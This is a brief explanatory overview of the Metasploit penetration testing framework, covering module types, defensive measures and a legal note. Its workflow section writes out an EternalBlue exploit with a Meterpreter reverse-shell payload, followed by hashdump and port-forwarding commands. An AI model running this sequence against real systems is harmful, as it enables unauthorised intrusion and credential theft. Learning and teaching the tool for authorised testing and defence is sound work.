    content: "# Metasploit Framework\n\nMetasploit is a penetration testing platform for developing and executing exploit code against a remote target. The community edition is free and ships with thousands of modules.\n\n## Module Types\n\n- Exploit: code that triggers a vulnerability on a target.\n- Payload: code that runs after a successful exploit (e.g., Meterpreter, reverse shell).\n- Auxiliary: scanners, fuzzers, DoS modules, credential sniffers.\n- Post: post-exploitation actions on a compromised host (privilege escalation, persistence, loot).\n- Encoder: obfuscates payloads to evade signature detection.\n- NOP generator: pads payloads to a fixed size.\n\n## Typical Workflow\n\n    msf6 > search eternalblue\n    msf6 > use exploit/windows/smb/ms17_010_eternalblue\n    msf6 (exploit) > set RHOSTS 10.0.0.5\n    msf6 (exploit) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n    msf6 (exploit) > set LHOST 10.0.0.10\n    msf6 (exploit) > exploit\n\nAfter a session opens, switch to it and run post modules:\n\n    meterpreter > sysinfo\n    meterpreter > getuid\n    meterpreter > hashdump\n    meterpreter > screenshot\n    meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.5\n\n## Meterpreter\n\nMeterpreter is an advanced, extensible payload that runs entirely in memory (in its default configuration) and provides a rich API: file operations, process migration, token impersonation, keylogging, webcam capture, and route pivoting.\n\n## Defense\n\n- Patch aggressively; Metasploit exploits almost always target publicly known CVEs.\n- Use EDR/AV with behavior-based detection; many Meterpreter stagers are well-signatured.\n- Network segmentation limits lateral movement after a foothold.\n- Disable SMBv1 and other legacy protocols.\n- Monitor for suspicious process injection (e.g., notepad.exe spawning cmd.exe).\n\n## Legal Note\n\nUse Metasploit only against systems you own or are authorized to test in writing.",
